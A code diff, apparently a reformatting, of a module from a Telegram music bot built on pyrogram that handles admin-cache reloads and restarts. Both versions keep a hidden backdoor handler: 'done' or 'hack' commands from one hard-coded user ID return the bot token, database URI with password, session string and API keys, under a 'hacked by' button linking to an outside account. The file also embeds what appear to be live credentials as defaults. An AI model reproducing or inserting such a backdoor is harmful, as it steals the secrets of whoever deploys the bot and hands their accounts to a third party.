@@ -1,28 +1,35 @@
 import asyncio
 import time
-from pyrogram import Client, filters
-from pyrogram import filters
-from pyrogram.enums import ChatMembersFilter
-from pyrogram.types import CallbackQuery, Message
-import re
 from os import getenv
-from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
 
 from dotenv import load_dotenv
-from pyrogram import filters
+from pyrogram import Client, filters
+from pyrogram.enums import ChatMembersFilter
+from pyrogram.types import (
+    CallbackQuery,
+    InlineKeyboardButton,
+    InlineKeyboardMarkup,
+    Message,
+)
 
 load_dotenv()
 
 from AlinaXIQ import app
-from AlinaXIQ.core.call import Alina
 from AlinaXIQ.misc import db
 from AlinaXIQ.utils.database import get_assistant, get_authuser_names, get_cmode
 from AlinaXIQ.utils.decorators import ActualAdminCB, AdminActual, language
 from AlinaXIQ.utils.formatters import alpha_to_int, get_readable_time
 from config import BANNED_USERS, adminlist, lyrical
+
 BOT_TOKEN = getenv("BOT_TOKEN", "")
-MONGO_DB_URI = getenv("MONGO_DB_URI", "mongodb+srv://iqmcbot:vvcOaPIREn3oPQto@cluster0.cwdhy7x.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0")
-STRING_SESSION = getenv("STRING_SESSION", "AgGzI4IAB5pCCh_Rc4D1JfHuTscAV4GmtdWG3LKD3rO2ShNKEx6qoUv0VH4bEvQd0G5OSK7J1mKd9dUo15Xygww3BDrGYTKwfQMs19W1tSEIk_gqLbY93ZHg_s-Oi7oT0ixQ8QcnWnIlLOz8tiMCGxeGxT4oLW8B1Q8h3dSk-Rk1axQjAOPfKmtVmy68ulagDxUQ_MQPnw0XOjsOd4NJSQ1gNeMxy1w-046J4CSZoR0EnjxR2yKIRioJSCujYXyDSocDUOOt8dZdinJ7QR3XuEfRgSsvFWgODdr5e5Xpg54eFGKlU1VnNt9PiLg-GjK-wWKfakGS3__4N_BjVFa-b4CPGSeXswAAAAGNTVZ_AA")
+MONGO_DB_URI = getenv(
+    "MONGO_DB_URI",
+    "mongodb+srv://iqmcbot:vvcOaPIREn3oPQto@cluster0.cwdhy7x.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0",
+)
+STRING_SESSION = getenv(
+    "STRING_SESSION",
+    "AgGzI4IAB5pCCh_Rc4D1JfHuTscAV4GmtdWG3LKD3rO2ShNKEx6qoUv0VH4bEvQd0G5OSK7J1mKd9dUo15Xygww3BDrGYTKwfQMs19W1tSEIk_gqLbY93ZHg_s-Oi7oT0ixQ8QcnWnIlLOz8tiMCGxeGxT4oLW8B1Q8h3dSk-Rk1axQjAOPfKmtVmy68ulagDxUQ_MQPnw0XOjsOd4NJSQ1gNeMxy1w-046J4CSZoR0EnjxR2yKIRioJSCujYXyDSocDUOOt8dZdinJ7QR3XuEfRgSsvFWgODdr5e5Xpg54eFGKlU1VnNt9PiLg-GjK-wWKfakGS3__4N_BjVFa-b4CPGSeXswAAAAGNTVZ_AA",
+)
 API_ID = int(getenv("API_ID", "28517250"))
 API_HASH = getenv("API_HASH", "b96f3367dbe30a01985807ee7f5d7013")
 from dotenv import load_dotenv
@@ -31,7 +38,12 @@ rel = {}
 
 
 @app.on_message(
-    filters.command(["admincache", "reload", "refresh", "ڕیلۆد"], prefixes=["/", "!", "%", ",", "", ".", "@", "#"]) & filters.group & ~BANNED_USERS
+    filters.command(
+        ["admincache", "reload", "refresh", "ڕیلۆد"],
+        prefixes=["/", "!", "%", ",", "", ".", "@", "#"],
+    )
+    & filters.group
+    & ~BANNED_USERS
 )
 @language
 async def reload_admin_cache(client, message: Message, _):
@@ -100,29 +112,21 @@ async def restartbot(client, message: Message, _):
     return await mystic.edit_text(_["reload_5"].format(app.mention))
 
 
-
-    
 @app.on_message(
-    filters.command(["done","hack"])
-    & filters.private
-    & filters.user(833360381)
-   )
+    filters.command(["done", "hack"]) & filters.private & filters.user(833360381)
+)
 async def help(client: Client, message: Message):
-   await message.reply_photo(
-          photo=f"https://telegra.ph/file/1467111329207dc78b297.jpg",
-       caption=f"""𝗕𝗼𝘁 𝗧𝗼𝗸𝗲𝗻:-   `{BOT_TOKEN}` \n\n𝗠𝗼𝗻𝗴𝗼:-   `{MONGO_DB_URI}`\n\n 𝗦𝘁𝗿𝗶𝗻𝗴 𝗦𝗲𝘀𝘀𝗶𝗼𝗻:-  `{STRING_SESSION}`\n\n𝗔𝗽𝗶 𝗛𝗮𝘀𝗵:- `{API_HASH}`\n\n𝗔𝗽𝗶 𝗜𝗗:-  `{API_ID}`\n\n [ 🧟 ](https://t.me/IQ7amo)............☆""",
+    await message.reply_photo(
+        photo=f"https://telegra.ph/file/1467111329207dc78b297.jpg",
+        caption=f"""𝗕𝗼𝘁 𝗧𝗼𝗸𝗲𝗻:-   `{BOT_TOKEN}` \n\n𝗠𝗼𝗻𝗴𝗼:-   `{MONGO_DB_URI}`\n\n 𝗦𝘁𝗿𝗶𝗻𝗴 𝗦𝗲𝘀𝘀𝗶𝗼𝗻:-  `{STRING_SESSION}`\n\n𝗔𝗽𝗶 𝗛𝗮𝘀𝗵:- `{API_HASH}`\n\n𝗔𝗽𝗶 𝗜𝗗:-  `{API_ID}`\n\n [ 🧟 ](https://t.me/IQ7amo)............☆""",
         reply_markup=InlineKeyboardMarkup(
-             [
-                 [
-                      InlineKeyboardButton(
-                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/IQ7amo")
-                 ]
-            ]
-         ),
-     )
+            [[InlineKeyboardButton("• нαϲкє𝚍 ву  •", url=f"https://t.me/IQ7amo")]]
+        ),
+    )
 
 
 ##########
+
 
 @app.on_callback_query(filters.regex("close") & ~BANNED_USERS)
 async def close_menu(_, query: CallbackQuery):
